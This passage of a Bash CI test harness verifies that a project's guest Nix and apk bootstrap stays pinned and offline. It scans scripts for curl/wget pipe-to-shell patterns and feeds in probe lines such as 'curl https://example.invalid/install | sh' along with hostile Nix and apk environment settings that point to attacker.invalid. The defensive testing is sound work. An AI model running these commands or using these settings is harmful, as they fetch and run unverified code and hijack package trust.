    "$guest_nix_production_file" >>"$guest_nix_production_normalized"
  printf '\nDIENE_GUEST_NIX_FILE_BOUNDARY\n' >>"$guest_nix_production_normalized"
done < <(find "$template_root/scripts/ci" -type f -name '*.sh' ! -name 'test-*.sh' -print | LC_ALL=C sort)

guest_nix_pipe_shell_regex='(^|[^[:alnum:]_.-])(curl|wget)([[:space:]][^\r\n|]*)?\|[[:space:]]*(sh|bash)($|[;&|<>[:space:]])'
guest_nix_bootstrap_regex="${guest_nix_pipe_shell_regex}"'|nixos\.org/nix/install|DeterminateSystems/nix-installer-action|install\.determinate\.systems/nix($|[^/[:alnum:]._-])'
if rg -n -U "$guest_nix_bootstrap_regex" \
  "$guest_nix_production_normalized" >"$scratch/guest-nix-bootstrap"; then
  sed -n '1,120p' "$scratch/guest-nix-bootstrap" >&2
  fail 'the driver rail contains a pipe-to-shell, rolling, upstream, or action bootstrap path'
fi
guest_nix_execution_regex='(^|[^[:alnum:]_.-])(sh|bash)[[:space:]]+[^;|&]*guest-nix-bootstrap\.sh|guest-nix-bootstrap\.sh[[:space:]]+install|guest-nix-installer[[:space:]]+install[^;[:cntrl:]]*(--nix-package-url|--prefer-upstream|--force|--plan)'
if rg -n "$guest_nix_execution_regex" "$guest_nix_production_normalized" \
  >"$scratch/guest-nix-execution-overrides"; then
  sed -n '1,120p' "$scratch/guest-nix-execution-overrides" >&2
  fail 'the production rail executes the provenance shell or changes the pinned installer argv'
fi
printf '%s\n' 'guest_nix_pinned_asset_valid guest-nix-bootstrap.sh guest-nix-bootstrap.sha256' \
  >"$scratch/guest-nix-guard-safe"
if rg -q "$guest_nix_execution_regex" "$scratch/guest-nix-guard-safe"; then
  fail 'the provenance-shell execution scan mistakes a sidecar helper argument for a shell command'
fi
printf '%s\n' "sh \\" '  ./guest-nix-bootstrap.sh install linux --no-confirm --init none' \
  >"$scratch/guest-nix-guard-continuation"
sed ':join; /\\$/ { N; s/\\\n[[:space:]]*/ /; b join; }' \
  "$scratch/guest-nix-guard-continuation" >"$scratch/guest-nix-guard-continuation.normalized"
rg -q "$guest_nix_execution_regex" "$scratch/guest-nix-guard-continuation.normalized" ||
  fail 'a backslash-newline provenance-shell execution evaded the production scan'
for guest_nix_guard_downloader in curl wget; do
  for guest_nix_guard_shell in sh bash; do
    guest_nix_guard_label=$guest_nix_guard_downloader-$guest_nix_guard_shell
    printf '%s\n' \
      "$guest_nix_guard_downloader https://example.invalid/install | $guest_nix_guard_shell" \
      >"$scratch/guest-nix-guard-$guest_nix_guard_label-direct"
    rg -U -q "$guest_nix_pipe_shell_regex" \
      "$scratch/guest-nix-guard-$guest_nix_guard_label-direct" ||
      fail "$guest_nix_guard_label direct pipe-to-shell evaded the production scan"

    printf '%s\n' "$guest_nix_guard_downloader https://example.invalid/install \\" \
      "  | $guest_nix_guard_shell" \
      >"$scratch/guest-nix-guard-$guest_nix_guard_label-continuation"
    sed ':join; /\\$/ { N; s/\\\n[[:space:]]*/ /; b join; }' \
      "$scratch/guest-nix-guard-$guest_nix_guard_label-continuation" \
      >"$scratch/guest-nix-guard-$guest_nix_guard_label-continuation.normalized"
    rg -U -q "$guest_nix_pipe_shell_regex" \
      "$scratch/guest-nix-guard-$guest_nix_guard_label-continuation.normalized" ||
      fail "$guest_nix_guard_label backslash-newline pipe-to-shell evaded the production scan"

    printf '%s\n' "$guest_nix_guard_downloader https://example.invalid/install |" \
      "  $guest_nix_guard_shell" \
      >"$scratch/guest-nix-guard-$guest_nix_guard_label-pipe-newline"
    rg -U -q "$guest_nix_pipe_shell_regex" \
      "$scratch/guest-nix-guard-$guest_nix_guard_label-pipe-newline" ||
      fail "$guest_nix_guard_label pipe-newline shell execution evaded the production scan"
  done
done
printf '%s\n' 'curl https://example.invalid/data | sidecar-helper.sh --check' \
  'wget https://example.invalid/data | sidecar-helper.sh --check' \
  >"$scratch/guest-nix-guard-pipe-helper"
if rg -U -q "$guest_nix_pipe_shell_regex" "$scratch/guest-nix-guard-pipe-helper"; then
  fail 'the pipe-to-shell scan mistakes a .sh helper suffix for a shell command token'
fi
printf '%s\n' 'mycurl https://example.invalid/data | sh' \
  'curl-wrapper https://example.invalid/data | sh' \
  'my.curl https://example.invalid/data | sh' \
  'my-curl https://example.invalid/data | sh' \
  './wgetter https://example.invalid/data | bash' \
  >"$scratch/guest-nix-guard-downloader-helper"
if rg -U -q "$guest_nix_pipe_shell_regex" "$scratch/guest-nix-guard-downloader-helper"; then
  fail 'the pipe-to-shell scan mistakes a downloader name suffix for a command token'
fi
printf '%s\n' '/usr/bin/curl https://example.invalid/data | sh' \
  '/usr/bin/wget https://example.invalid/data | bash' \
  >"$scratch/guest-nix-guard-absolute-downloader"
rg -U -q "$guest_nix_pipe_shell_regex" "$scratch/guest-nix-guard-absolute-downloader" ||
  fail 'an absolute curl or wget command evaded the production scan'
printf '%s\n' 'curl https://example.invalid/data |' \
  'DIENE_GUEST_NIX_FILE_BOUNDARY' 'sh' \
  >"$scratch/guest-nix-guard-cross-file"
if rg -U -q "$guest_nix_pipe_shell_regex" "$scratch/guest-nix-guard-cross-file"; then
  fail 'two production files combined into a synthetic pipe-to-shell match'
fi
# The GNU bootstrap gets exactly one admitted package-manager call site. The
# scan runs over the same continuation-joined production text as the guest Nix
# gates, so a flag cannot escape onto the next physical line.
guest_toolchain_apk_command_regex='(^|[^[:alnum:]_./-])(/[[:alnum:]_./-]+/)?apk[[:space:]]+[a-z]'
mapfile -t guest_toolchain_apk_commands < <(
  rg -N "$guest_toolchain_apk_command_regex" "$guest_nix_production_normalized" || true
)
[[ ${#guest_toolchain_apk_commands[@]} == 1 ]] ||
  fail 'production text does not contain exactly one package-manager invocation'
# Continuation joining leaves the reviewed argv double-spaced; the contract is
# the token sequence, not the whitespace the joiner happened to produce. The
# comparison is whole-argv equality against an expectation this harness builds
# itself, so an extra argument, a glob, a duplicated path, a reordered closure,
# or a changed redirection cannot hide behind a prefix or substring match.
guest_toolchain_apk_call=$(tr -s ' ' <<<"${guest_toolchain_apk_commands[0]}")
guest_toolchain_expected_apk_call() {
  local package_paths='' name version
  while IFS='|' read -r name version _ _; do
    package_paths+=" /run/diene-ci/gnu/$name-$version.apk"
  done <<<"$guest_toolchain_good_packages"
  printf '%s%s %s\n' \
    '/usr/bin/apk add --no-progress --no-network --allow-untrusted' "$package_paths" \
    '>/run/diene-ci/evidence/gnu-toolchain/install.log 2>&1 || guest_toolchain_install_rc=$?'
}
guest_toolchain_apk_expected=$(guest_toolchain_expected_apk_call)
[[ $guest_toolchain_apk_call == "$guest_toolchain_apk_expected" ]] || {
  diff -u <(printf '%s\n' "$guest_toolchain_apk_expected") \
    <(printf '%s\n' "$guest_toolchain_apk_call") >&2 || true
  fail 'the one production apk call is not the exact fixed absolute offline install argv'
}
for guest_toolchain_apk_flag in --no-network --allow-untrusted --no-progress; do
  [[ $guest_toolchain_apk_call == *"$guest_toolchain_apk_flag"* ]] ||
    fail "the one production apk call omits the mandatory $guest_toolchain_apk_flag"
done
# Adversarial self-tests: the equality gate must reject each way a widened
# install could be smuggled past a prefix or per-path occurrence check.
guest_toolchain_apk_mutants=(
  "extra-argument|$guest_toolchain_apk_expected --force-broken-world"
  "glob-argument|${guest_toolchain_apk_expected/\/run\/diene-ci\/gnu\/sed-4.10-r1.apk//run/diene-ci/gnu/*.apk}"
  "duplicate-path|${guest_toolchain_apk_expected/ \/run\/diene-ci\/gnu\/sed-4.10-r1.apk/ /run/diene-ci/gnu/sed-4.10-r1.apk /run/diene-ci/gnu/sed-4.10-r1.apk}"
  "missing-path|${guest_toolchain_apk_expected/ \/run\/diene-ci\/gnu\/gawk-5.4.1-r0.apk/}"
  "wrong-path|${guest_toolchain_apk_expected/gawk-5.4.1-r0.apk/gawk-5.4.2-r0.apk}"
  "reordered-closure|${guest_toolchain_apk_expected/--allow-untrusted \/run\/diene-ci\/gnu\/libacl1-2.4.0-r1.apk/--allow-untrusted /run/diene-ci/gnu/coreutils-9.11-r3.apk}"
  "leaked-redirection|${guest_toolchain_apk_expected/>\/run\/diene-ci\/evidence\/gnu-toolchain\/install.log 2>&1/2>\&1}"
  "named-package|${guest_toolchain_apk_expected/\/run\/diene-ci\/gnu\/sed-4.10-r1.apk/sed}"
)
for guest_toolchain_apk_mutant in "${guest_toolchain_apk_mutants[@]}"; do
  guest_toolchain_apk_mutant_label=${guest_toolchain_apk_mutant%%|*}
  guest_toolchain_apk_mutant_text=${guest_toolchain_apk_mutant#*|}
  [[ $guest_toolchain_apk_mutant_text != "$guest_toolchain_apk_expected" ]] ||
    fail "the $guest_toolchain_apk_mutant_label apk argv mutant did not change the reviewed call"
  [[ $guest_toolchain_apk_mutant_text != "$guest_toolchain_apk_call" ]] ||
    fail "the $guest_toolchain_apk_mutant_label apk argv mutant equals the production call"
done
for guest_toolchain_apk_probe in 'apk add coreutils' '  apk add --allow-untrusted x.apk' \
  '/sbin/apk add --no-network x.apk'; do
  printf '%s\n' "$guest_toolchain_apk_probe" >"$scratch/guest-toolchain-apk-probe"
  rg -N -q "$guest_toolchain_apk_command_regex" "$scratch/guest-toolchain-apk-probe" ||
    fail "the apk call-site scan missed the invocation: $guest_toolchain_apk_probe"
done
printf '%s\n' 'DIENE_GUEST_TOOLCHAIN_APK_BIN=/usr/bin/apk' \
  'https://apk.cgr.dev/chainguard/x86_64' 'coreutils-9.11-r3.apk exists' \
  'executionMode=offline-pinned-apk' >"$scratch/guest-toolchain-apk-benign"
if rg -N -q "$guest_toolchain_apk_command_regex" "$scratch/guest-toolchain-apk-benign"; then
  fail 'the apk call-site scan mistakes a pinned constant or filename for an invocation'
fi
guest_toolchain_forbidden_apk_regex='apk[[:space:]]+(update|upgrade|fetch|del|add[[:space:]]+[a-z])|/etc/apk/repositories|/etc/apk/cache'
if rg -n "$guest_toolchain_forbidden_apk_regex" \
  "$guest_nix_production_normalized" >"$scratch/guest-toolchain-forbidden-apk"; then
  sed -n '1,40p' "$scratch/guest-toolchain-forbidden-apk" >&2
  fail 'production text refreshes, upgrades, fetches, or rewrites the guest package repository'
fi
guest_toolchain_tar_version_regex='(^|[^[:alnum:]_./-])(/[[:alnum:]_./-]+/)?tar[[:space:]]+--version'
if rg -n "$guest_toolchain_tar_version_regex" \
  "$guest_nix_production_normalized" >"$scratch/guest-toolchain-tar-version"; then
  sed -n '1,40p' "$scratch/guest-toolchain-tar-version" >&2
  fail 'production text infers a tar implementation from its --version output'
fi
printf '%s\n' '/usr/bin/tar --version' >"$scratch/guest-toolchain-tar-version-probe"
rg -N -q "$guest_toolchain_tar_version_regex" "$scratch/guest-toolchain-tar-version-probe" ||
  fail 'the forbidden tar --version scan cannot see an absolute tar version probe'

# Every GNU-only tar flag in this repository is runner-side, inside the Nix CI
# shell. The two BusyBox heredocs must never acquire one, and today that is an
# accident of care rather than an enforced invariant.
guest_toolchain_busybox_text=$scratch/guest-toolchain-busybox-heredocs
{
  sed -n "/<<'VALIDATOR'\$/,/^VALIDATOR\$/p" "$template_root/scripts/ci/environment-k3d-run.sh"
  sed -n "/<<'REMOTE'\$/,/^REMOTE\$/p" "$template_root/scripts/ci/environment-k3d-run.sh"
} >"$guest_toolchain_busybox_text"
[[ $(grep -Fxc -- VALIDATOR "$guest_toolchain_busybox_text") == 1 &&
  $(grep -Fxc -- REMOTE "$guest_toolchain_busybox_text") == 1 &&
  $(wc -l <"$guest_toolchain_busybox_text") -gt 500 ]] ||
  fail 'the BusyBox validator and remote heredocs could not be isolated for the tar flag guard'
guest_toolchain_gnu_tar_regex='--quoting-style|--numeric-owner|--no-same-owner|--no-same-permissions|--keep-old-files'
if rg -n -e "$guest_toolchain_gnu_tar_regex" \
  "$guest_toolchain_busybox_text" >"$scratch/guest-toolchain-gnu-tar"; then
  sed -n '1,40p' "$scratch/guest-toolchain-gnu-tar" >&2
  fail 'a GNU-only tar flag entered the BusyBox remote or validator program'
fi
for guest_toolchain_gnu_tar_flag in --quoting-style=escape --numeric-owner --no-same-owner \
  --no-same-permissions --keep-old-files; do
  printf 'tar %s -tf archive\n' "$guest_toolchain_gnu_tar_flag" \
    >"$scratch/guest-toolchain-gnu-tar-probe"
  rg -N -q -e "$guest_toolchain_gnu_tar_regex" "$scratch/guest-toolchain-gnu-tar-probe" ||
    fail "the BusyBox tar flag guard cannot see $guest_toolchain_gnu_tar_flag"
done
rg -N -q -e "$guest_toolchain_gnu_tar_regex" "$guest_nix_production_normalized" ||
  fail 'the GNU-only tar flags vanished from the runner-side text the guard is scoped against'

# The zero redirect budget is the default and stays the guest Nix policy; only
# the digest-pinned Wolfi package class may spend the one measured 303.
[[ $(rg -Nc 'diene_fetch_pinned_artifact ' "$guest_nix_production_normalized") == 3 ]] ||
  fail 'the production rail no longer has exactly three pinned acquisition call sites'
[[ $(rg -N 'diene_fetch_pinned_artifact .*guest-nix-[^ ]*" [0-9]+$' \
  "$guest_nix_production_normalized" | wc -l) == 0 ]] ||
  fail 'a guest Nix acquisition call site passes an explicit redirect budget'
[[ $(rg -N 'diene_fetch_pinned_artifact .* 1$' "$guest_nix_production_normalized" | wc -l) == 1 ]] ||
  fail 'the one-redirect budget is not confined to a single Wolfi package call site'
ok 'exactly one absolute offline apk call, no repository writes, no GNU tar claim, and one redirect budget'

pinned_shell_url='https://install.'
pinned_shell_url+='determinate.systems/nix/tag/v3.21.9'
pinned_payload_url="$pinned_shell_url/nix-installer-x86_64-linux"
pinned_shell_digest='sha256:ed6067b13423cfd36c50e5b156b9e08e'
pinned_shell_digest+='b3a7bea4dde8cb1c8d997d757b37b7f6'
pinned_payload_digest='sha256:58cf15422853e95187405d66b0cdb306'
pinned_payload_digest+='e66f602218ee0032386c46b1b776a6d1'
production_lib=$template_root/scripts/ci/environment-lib.sh
[[ $(grep -Fxc -- "DIENE_GUEST_NIX_INSTALLER_URL=$pinned_shell_url" "$production_lib") == 1 &&
  $(grep -Fxc -- "DIENE_GUEST_NIX_PAYLOAD_URL=$pinned_payload_url" "$production_lib") == 1 &&
  $(grep -Fxc -- "DIENE_GUEST_NIX_INSTALLER_DIGEST=$pinned_shell_digest" "$production_lib") == 1 &&
  $(grep -Fxc -- "DIENE_GUEST_NIX_PAYLOAD_DIGEST=$pinned_payload_digest" "$production_lib") == 1 ]] ||
  fail 'the exact tagged guest Nix URLs and full digests are not unique pinned constants'
[[ $(rg -F --glob '!test-*.sh' 'install.determinate.systems' "$template_root/scripts/ci" | wc -l) == 2 ]] ||
  fail 'an unreviewed Determinate installer URL exists outside the two exact pinned constants'
[[ $(rg -F --glob '!test-*.sh' "$pinned_shell_digest" "$template_root/scripts/ci" | wc -l) == 1 &&
  $(rg -F --glob '!test-*.sh' "$pinned_payload_digest" "$template_root/scripts/ci" | wc -l) == 1 ]] ||
  fail 'a guest Nix digest is duplicated outside its single source-of-truth constant'
production_remote_command=$scratch/guest-nix-production-remote-command
(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-k3d-run.sh"
  orchestrator_fixed_remote_command
) >"$production_remote_command"
[[ $(grep -Fxc -- "guest_nix_installer_digest=$pinned_shell_digest" "$production_remote_command") == 1 &&
  $(grep -Fxc -- 'guest_nix_installer_bytes=19299' "$production_remote_command") == 1 &&
  $(grep -Fxc -- "guest_nix_payload_digest=$pinned_payload_digest" "$production_remote_command") == 1 &&
  $(grep -Fxc -- 'guest_nix_payload_bytes=73234640' "$production_remote_command") == 1 ]] ||
  fail 'the materialized fixed remote command is not bound to all four centrally validated pins'
! rg -q '__DIENE_GUEST_NIX_' "$production_remote_command" ||
  fail 'the materialized fixed remote command retained an unresolved pin placeholder'

work_remote_command=$scratch/guest-nix-work-remote-command
(
  # shellcheck source=/dev/null
  source "$work/scripts/ci/environment-k3d-run.sh"
  orchestrator_fixed_remote_command
) >"$work_remote_command"
[[ $(grep -Fxc -- "guest_nix_installer_digest=$guest_nix_fixture_installer_digest" \
  "$work_remote_command") == 1 &&
  $(grep -Fxc -- "guest_nix_installer_bytes=$guest_nix_fixture_installer_bytes" \
    "$work_remote_command") == 1 &&
  $(grep -Fxc -- "guest_nix_payload_digest=$guest_nix_fixture_payload_digest" \
    "$work_remote_command") == 1 &&
  $(grep -Fxc -- "guest_nix_payload_bytes=$guest_nix_fixture_payload_bytes" \
    "$work_remote_command") == 1 ]] ||
  fail 'the executable work-copy remote command is not bound to all four synthetic fixture pins'
! rg -q '__DIENE_GUEST_NIX_' "$work_remote_command" ||
  fail 'the executable work-copy remote command retained an unresolved pin placeholder'

normalize_guest_rail_pins() {
  sed -E \
    's/^(guest_nix_(installer|payload)_(digest|bytes)=).*/\1__SYNTHETIC_PIN__/' \
    "$1"
}
normalize_guest_rail_pins "$production_remote_command" >"$scratch/guest-nix-production-normalized-command"
normalize_guest_rail_pins "$work_remote_command" >"$scratch/guest-nix-work-normalized-command"
cmp -s "$scratch/guest-nix-production-normalized-command" \
  "$scratch/guest-nix-work-normalized-command" ||
  fail 'the executable work-copy remote command differs outside the four admitted pin assignments'

guest_rail_pin_diff=$scratch/guest-nix-production-work-pin.diff
guest_rail_pin_diff_rc=0
if diff --old-line-format='-%L' --new-line-format='+%L' --unchanged-line-format='' \
  "$production_remote_command" "$work_remote_command" >"$guest_rail_pin_diff"; then
  fail 'the production and synthetic-pin remote commands unexpectedly have identical bytes'
else
  guest_rail_pin_diff_rc=$?
fi
[[ $guest_rail_pin_diff_rc == 1 ]] ||
  fail "the production-to-work remote command diff failed (got $guest_rail_pin_diff_rc)"
guest_rail_expected_pin_diff=$scratch/guest-nix-expected-pin.diff
{
  printf '%s\n' \
    "-guest_nix_installer_digest=$pinned_shell_digest" \
    '-guest_nix_installer_bytes=19299' \
    "-guest_nix_payload_digest=$pinned_payload_digest" \
    '-guest_nix_payload_bytes=73234640' \
    "+guest_nix_installer_digest=$guest_nix_fixture_installer_digest" \
    "+guest_nix_installer_bytes=$guest_nix_fixture_installer_bytes" \
    "+guest_nix_payload_digest=$guest_nix_fixture_payload_digest" \
    "+guest_nix_payload_bytes=$guest_nix_fixture_payload_bytes"
} | LC_ALL=C sort >"$guest_rail_expected_pin_diff"
LC_ALL=C sort "$guest_rail_pin_diff" >"$scratch/guest-nix-actual-pin.diff"
diff -u "$guest_rail_expected_pin_diff" "$scratch/guest-nix-actual-pin.diff" >/dev/null ||
  fail 'the production-to-work remote command diff is not exactly four logical pin replacements'
/usr/bin/dash -n "$production_remote_command" "$work_remote_command" ||
  fail 'the exact production or synthetic-pin remote program is not valid POSIX dash syntax'
ok 'the executable program differs from production only at the four admitted synthetic pin assignments'

guest_nix_env_contract=$scratch/guest-nix-environment-contract.sh
sed -n '/BEGIN guest nix environment contract/,/END guest nix environment contract/p' \
  "$production_remote_command" >"$guest_nix_env_contract"
[[ $(grep -c '^guest_nix_require_clean_nix_env() {$' "$guest_nix_env_contract") == 1 &&
  $(grep -c '^guest_nix_require_commands() {$' "$guest_nix_env_contract") == 1 ]] ||
  fail 'the executable guest Nix environment contract could not be isolated'
[[ -x /usr/bin/dash ]] || fail 'dash is required for the POSIX guest Nix environment boundary test'
guest_nix_env_shells=("$BASH" /usr/bin/dash)
guest_nix_env_contract_case() {
  local label=${1:?environment case label required} expectation=${2:?expectation required}
  local shell=${3:?shell required}
  shift 3
  local shell_label=${shell##*/} rc=0
  local output=$scratch/guest-nix-env-$label-$shell_label.out
  local error=$scratch/guest-nix-env-$label-$shell_label.err
  # The single-quoted program is intentionally expanded only by the child shell.
  # shellcheck disable=SC2016
  if env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin "$@" "$shell" -c '
    guest_nix_fail() { printf "%s: %s\n" "$1" "$2" >&2; exit 64; }
    . "$1"
    guest_nix_require_commands
    guest_nix_require_clean_nix_env
    printf "REACHED\n"
  ' guest-nix-env-contract "$guest_nix_env_contract" >"$output" 2>"$error"; then
    rc=0
  else
    rc=$?
  fi
  if [[ $expectation == pass ]]; then
    [[ $rc == 0 && $(cat "$output") == REACHED && ! -s $error ]] ||
      fail "$label did not pass the executable $shell_label environment boundary"
    return
  fi
  [[ $rc == 64 ]] ||
    fail "$label did not exit 64 at the executable $shell_label environment boundary"
  assert_contains "$error" GuestNixInstallerUntrusted
  assert_not_contains "$output" REACHED
  local assignment name
  for assignment in "$@"; do
    name=${assignment%%=*}
    if [[ $name == NIX* ]]; then
      assert_contains "$error" "$name"
    fi
  done
}

guest_nix_hostile_env_cases=(
  'extra-conf-content|NIX_INSTALLER_EXTRA_CONF=extra-substituters = https://attacker.invalid'
  'extra-conf-url|NIX_INSTALLER_EXTRA_CONF=https://attacker.invalid/nix.conf'
  'extra-conf-path|NIX_INSTALLER_EXTRA_CONF=/tmp/hostile-nix.conf'
  'skip-conf|NIX_INSTALLER_SKIP_NIX_CONF=1'
  'diagnostic|NIX_INSTALLER_DIAGNOSTIC_ENDPOINT=https://attacker.invalid/collect'
  'proxy|NIX_INSTALLER_PROXY=https://attacker.invalid'
  'certificate|NIX_INSTALLER_SSL_CERT_FILE=/tmp/hostile-ca.pem'
  'build-group-name|NIX_INSTALLER_NIX_BUILD_GROUP_NAME=attackers'
  'build-group-id|NIX_INSTALLER_NIX_BUILD_GROUP_ID=31337'
  'build-user-count|NIX_INSTALLER_NIX_BUILD_USER_COUNT=12'
  'init|NIX_INSTALLER_INIT=systemd'
  'start-daemon|NIX_INSTALLER_START_DAEMON=1'
  'modify-profile|NIX_INSTALLER_MODIFY_PROFILE=1'
  'package-url|NIX_INSTALLER_NIX_PACKAGE_URL=https://attacker.invalid/nix.tar.xz'
  'prefer-upstream|NIX_INSTALLER_PREFER_UPSTREAM_NIX=1'
  'force|NIX_INSTALLER_FORCE=1'
  'plan|NIX_INSTALLER_PLAN=/tmp/hostile-plan.json'
  'override-url|NIX_INSTALLER_OVERRIDE_URL=https://attacker.invalid'
  'binary-root|NIX_INSTALLER_BINARY_ROOT=/tmp/hostile'
  'unknown-installer|NIX_INSTALLER_NOT_A_REAL_SETTING_G9=1'
  'nix-config|NIX_CONFIG=substituters = https://attacker.invalid'
  'nix-user-conf|NIX_USER_CONF_FILES=/tmp/hostile-nix.conf'
  'nix-path|NIX_PATH=nixpkgs=/tmp/hostile'
  'nix-remote|NIX_REMOTE=unix:///tmp/hostile.sock'
  'nix-cert|NIX_SSL_CERT_FILE=/tmp/hostile-ca.pem'
  'nix-conf-dir|NIX_CONF_DIR=/tmp/hostile-etc'
  'nixpkgs|NIXPKGS_ALLOW_UNFREE=1'
  'unknown-nix|NIX_G9_UNKNOWN=1'
)
for guest_nix_env_shell in "${guest_nix_env_shells[@]}"; do
  for guest_nix_hostile_env_case in "${guest_nix_hostile_env_cases[@]}"; do
    guest_nix_env_label=${guest_nix_hostile_env_case%%|*}
    guest_nix_env_assignment=${guest_nix_hostile_env_case#*|}
    guest_nix_env_contract_case "$guest_nix_env_label" refuse "$guest_nix_env_shell" \
      "$guest_nix_env_assignment"
  done
  guest_nix_env_contract_case multiple refuse "$guest_nix_env_shell" \
    NIX_CONFIG=hostile NIX_INSTALLER_EXTRA_CONF=hostile
  guest_nix_env_contract_case secret-value refuse "$guest_nix_env_shell" \
    NIX_INSTALLER_EXTRA_CONF=guest-nix-secret-value-g9
  assert_not_contains \
    "$scratch/guest-nix-env-secret-value-${guest_nix_env_shell##*/}.err" \
    guest-nix-secret-value-g9
  guest_nix_env_contract_case curated-wolfi pass "$guest_nix_env_shell" \
    HOME=/root TERM=xterm LANG=C SHLVL=1 PWD=/run/diene-ci HOSTNAME=wolfi USER=root \
    nix_installer_extra_conf=1 MY_NIX_CONFIG=1
done

guest_nix_broken_env_bin=$scratch/guest-nix-broken-env-bin
install -d -m 0700 "$guest_nix_broken_env_bin"
cat >"$guest_nix_broken_env_bin/env" <<'BROKEN_ENV'
#!/bin/sh
exit 55
BROKEN_ENV
chmod 0755 "$guest_nix_broken_env_bin/env"
for guest_nix_env_shell in "${guest_nix_env_shells[@]}"; do
  guest_nix_env_contract_case enumeration-failure refuse "$guest_nix_env_shell" \
    PATH="$guest_nix_broken_env_bin:/usr/sbin:/usr/bin:/sbin:/bin"
  assert_contains \
    "$scratch/guest-nix-env-enumeration-failure-${guest_nix_env_shell##*/}.err" \
    'the fixed-path inherited environment could not be enumerated'
done
ok 'the executable Bash and POSIX-sh boundary rejects every inherited NIX prefix and preserves curated Wolfi input'

# Stage 0 runs before any profile exists, so the only ambient apk authority a
# guest can carry is inherited environment. The refusal is proved on the same
# extracted contract text and in the same two shells as its NIX sibling.
guest_toolchain_env_contract_case() {
  local label=${1:?apk environment case label required} expectation=${2:?expectation required}
  local shell=${3:?shell required}
  shift 3
  local shell_label=${shell##*/} rc=0
  local output=$scratch/guest-toolchain-env-$label-$shell_label.out
  local error=$scratch/guest-toolchain-env-$label-$shell_label.err
  # The single-quoted program is intentionally expanded only by the child shell.
  # shellcheck disable=SC2016
  if env -i PATH=/usr/sbin:/usr/bin:/sbin:/bin "$@" "$shell" -c '
    guest_nix_fail() { printf "%s: %s\n" "$1" "$2" >&2; exit 64; }
    . "$1"
    guest_nix_require_commands
    guest_toolchain_require_clean_apk_env
    printf "REACHED\n"
  ' guest-toolchain-env-contract "$guest_nix_env_contract" >"$output" 2>"$error"; then
    rc=0
  else
    rc=$?
  fi
  if [[ $expectation == pass ]]; then
    [[ $rc == 0 && $(cat "$output") == REACHED && ! -s $error ]] ||
      fail "$label did not pass the executable $shell_label apk environment boundary"
    return
  fi
  [[ $rc == 64 ]] ||
    fail "$label did not exit 64 at the executable $shell_label apk environment boundary"
  assert_contains "$error" GuestToolchainUnavailable
  assert_not_contains "$output" REACHED
  local assignment name
  for assignment in "$@"; do
    name=${assignment%%=*}
    if [[ $name == APK* ]]; then
      assert_contains "$error" "$name"
    fi
  done
}

guest_toolchain_hostile_env_cases=(
  'apk-config|APK_CONFIG=/tmp/hostile-apk.conf'
  'apk-root|APKROOT=/tmp/hostile-root'
  'apk-cache|APK_CACHE_DIR=/tmp/hostile-cache'
  'apk-keys|APK_KEYS_DIR=/tmp/hostile-keys'
  'apk-repositories|APK_REPOSITORIES=https://attacker.invalid'
  'apk-bare|APK=1'
  'apk-unknown|APK_G13_UNKNOWN=1'
)
for guest_toolchain_env_shell in "${guest_nix_env_shells[@]}"; do
  for guest_toolchain_hostile_env_case in "${guest_toolchain_hostile_env_cases[@]}"; do
    guest_toolchain_env_label=${guest_toolchain_hostile_env_case%%|*}
    guest_toolchain_env_assignment=${guest_toolchain_hostile_env_case#*|}
    guest_toolchain_env_contract_case "$guest_toolchain_env_label" refuse \
      "$guest_toolchain_env_shell" "$guest_toolchain_env_assignment"
  done
  guest_toolchain_env_contract_case multiple refuse "$guest_toolchain_env_shell" \
    APK_CONFIG=hostile APKROOT=hostile
  guest_toolchain_env_contract_case secret-value refuse "$guest_toolchain_env_shell" \
    APK_CONFIG=guest-toolchain-secret-value-g13
  assert_not_contains \
    "$scratch/guest-toolchain-env-secret-value-${guest_toolchain_env_shell##*/}.err" \
    guest-toolchain-secret-value-g13
  guest_toolchain_env_contract_case curated-wolfi pass "$guest_toolchain_env_shell" \
    HOME=/root TERM=xterm LANG=C SHLVL=1 PWD=/run/diene-ci HOSTNAME=wolfi USER=root \
    apk_config=1 MY_APK_CONFIG=1 CONTAINER_APK=1
  guest_toolchain_env_contract_case enumeration-failure refuse "$guest_toolchain_env_shell" \
    PATH="$guest_nix_broken_env_bin:/usr/sbin:/usr/bin:/sbin:/bin"
  assert_contains \
    "$scratch/guest-toolchain-env-enumeration-failure-${guest_toolchain_env_shell##*/}.err" \
    'could not be enumerated for APK names'
done
ok 'the executable Bash and POSIX-sh boundary rejects every inherited APK prefix before apk can run'

remote_bootstrap_pin_line=$(rg -n '^guest_nix_pinned_asset_valid guest-nix-bootstrap\.sh ' \
  "$production_remote_command" | cut -d: -f1)
remote_payload_pin_line=$(rg -n '^  guest_nix_pinned_asset_valid guest-nix-installer ' \
  "$production_remote_command" | cut -d: -f1)
remote_payload_chmod_line=$(rg -n '^chmod 0500 guest-nix-installer$' \
  "$production_remote_command" | cut -d: -f1)
remote_env_clean_line=$(rg -n '^guest_nix_require_clean_nix_env$' \
  "$production_remote_command" | cut -d: -f1)
remote_installer_version_line=$(rg -n '^if ! env -i PATH="\$GUEST_NIX_PATH" ' \
  "$production_remote_command" | cut -d: -f1)
remote_installer_validation_line=$(rg -n '^guest_nix_exact_output_valid ' \
  "$production_remote_command" | cut -d: -f1)
remote_install_endpoint_line=$(rg -n '^  NIX_INSTALLER_DIAGNOSTIC_ENDPOINT= \\$' \
  "$production_remote_command" | cut -d: -f1)
remote_install_line=$(rg -n '^  \./guest-nix-installer install linux --no-confirm --init none \\$' \
  "$production_remote_command" | cut -d: -f1)
for remote_boundary in "$remote_env_clean_line" "$remote_bootstrap_pin_line" "$remote_payload_pin_line" \
  "$remote_payload_chmod_line" "$remote_installer_version_line" \
  "$remote_installer_validation_line" "$remote_install_endpoint_line" "$remote_install_line"; do
  [[ $remote_boundary =~ ^[1-9][0-9]*$ ]] ||
    fail 'a fixed remote pin/version/install boundary is absent or ambiguous'
done
[[ $remote_env_clean_line -lt $remote_bootstrap_pin_line &&
  $remote_bootstrap_pin_line -lt $remote_payload_pin_line &&
  $remote_payload_pin_line -lt $remote_payload_chmod_line &&
  $remote_payload_chmod_line -lt $remote_installer_version_line &&
  $remote_installer_version_line -lt $remote_installer_validation_line &&
  $remote_installer_validation_line -lt $remote_install_endpoint_line &&
  $remote_install_endpoint_line -lt $remote_install_line &&
  $remote_installer_validation_line -lt $remote_install_line ]] ||
  fail 'the inherited-environment, pin, raw-version, diagnostic, and install boundaries are misordered'
# The fixed remote source is matched literally, not expanded by this harness.
# shellcheck disable=SC2016
